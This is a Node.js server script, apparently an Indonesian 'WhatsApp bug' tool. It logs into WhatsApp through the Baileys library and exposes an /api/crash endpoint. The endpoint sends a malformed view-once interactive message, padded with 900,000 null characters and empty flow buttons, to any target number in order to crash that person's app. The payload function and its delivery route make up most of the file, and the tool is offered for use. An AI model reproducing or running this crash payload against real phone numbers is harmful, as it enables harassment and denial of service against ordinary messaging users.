const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

// Inisialisasi WhatsApp Socket
let sock = null;
let pairingCode = null;

// Fungsi untuk menghubungkan WhatsApp
async function connectToWhatsApp() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState("auth_info");
    const { version } = await fetchLatestBaileysVersion();
    
    sock = makeWASocket({
      version,
      printQRInTerminal: true,
      auth: state,
      generateHighQualityLinkPreview: true,
    });
    
    // Generate pairing code
    try {
      pairingCode = await sock.requestPairingCode("RiexxDeCodeX-Bot");
      console.log("Pairing Code:", pairingCode);
    } catch (error) {
      console.error("Error generating pairing code:", error);
    }
    
    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        console.log("Connection closed, reconnecting...");
        setTimeout(connectToWhatsApp, 5000);
      } else if (connection === "open") {
        console.log("WhatsApp connection opened!");
        pairingCode = null; // Clear pairing code after successful connection
      }
    });
  } catch (error) {
    console.error("Error connecting to WhatsApp:", error);
  }
}

// Panggil fungsi koneksi
connectToWhatsApp();

const loadUsers = () => {
  try {
    return JSON.parse(fs.readFileSync("./users.json", "utf8"));
  } catch (error) {
    return [];
  }
};

const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

// Function InvisibleLoadFast yang diperbaiki
async function InvisibleLoadFast(target) {
  if (!sock) {
    throw new Error("WhatsApp connection not established yet");
  }
  
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "⏤͟͟͞͞ꀸꍟ꒒ꀎꏳꍏ ꀤꑄ ꃅꍟꋪꍟ⿻" + "\u0000".repeat(900000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
    return true;
  } catch (err) {
    console.log("Error in InvisibleLoadFast:", err);
    throw err;
  }
}

// API Routes
app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role, timestamp: new Date().toISOString() });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin", timestamp: new Date().toISOString() });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    user.timestamp = new Date().toISOString();
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// Endpoint untuk generate pairing code - YANG BARU DITAMBAHKAN
app.post("/api/generate-pairing", async (req, res) => {
  try {
    if (!sock) {
      return res.status(503).json({ success: false, message: "WhatsApp client not initialized" });
    }
    
    if (!pairingCode) {
      // Generate new pairing code if none exists
      try {
        pairingCode = await sock.requestPairingCode("RiexxDeCodeX-Bot");
      } catch (error) {
        return res.status(500).json({ success: false, message: "Failed to generate pairing code: " + error.message });
      }
    }
    
    res.json({ success: true, pairingCode });
  } catch (error) {
    res.status(500).json({ success: false, message: "Error generating pairing code: " + error.message });
  }
});

// Endpoint untuk mengecek status koneksi - YANG BARU DITAMBAHKAN
app.get("/api/connection-status", (req, res) => {
  if (sock && sock.user?.id) {
    res.json({ 
      success: true, 
      connected: true, 
      user: sock.user.id.replace(/:\d+@/, '@') 
    });
  } else {
    res.json({ success: false, connected: false, user: null });
  }
});

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  // Pastikan koneksi WhatsApp sudah terbuka
  if (!sock || sock.user?.id === undefined) {
    return res.status(503).json({ 
      success: false, 
      message: "WhatsApp connection not ready. Please connect first." 
    });
  }

  try {
    await InvisibleLoadFast(target);
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log("Please check terminal for QR code to connect WhatsApp");
});